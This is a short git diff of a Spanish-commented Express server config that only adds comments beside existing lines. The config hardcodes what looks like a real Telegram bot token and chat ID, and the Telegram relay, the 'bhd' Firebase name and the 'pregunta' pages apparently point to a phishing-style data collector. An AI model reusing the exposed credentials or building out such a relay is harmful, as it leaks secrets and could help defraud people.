@@ -14,8 +14,8 @@ app.use(express.json());
 // === CONFIGURACIÓN DE TELEGRAM ===
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8302617462:AAGikIPtSly1eLtqJdEOQ8w2AoCGEj9gGKY';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1002991672575';
-const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
-const SERVER_URL = process.env.RENDER_URL || 'https://bhs-8syw.onrender.com';
+const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`; // ✅ ESPACIO ELIMINADO
+const SERVER_URL = process.env.RENDER_URL || 'https://bhs-8syw.onrender.com'; // ✅ ESPACIO ELIMINADO
 const ALLOWED_PAGES = [
   'index.html',
   'pregunta-1.html',
@@ -71,7 +71,7 @@ try {
 try {
   admin.initializeApp({
     credential: admin.credential.cert(serviceAccount),
-    databaseURL: 'https://bhd-firebase-default-rtdb.firebaseio.com'
+    databaseURL: 'https://bhd-firebase-default-rtdb.firebaseio.com' // ✅ ESPACIO ELIMINADO
   });
   console.log('✅ Firebase Admin SDK inicializado correctamente');
 } catch (error) {
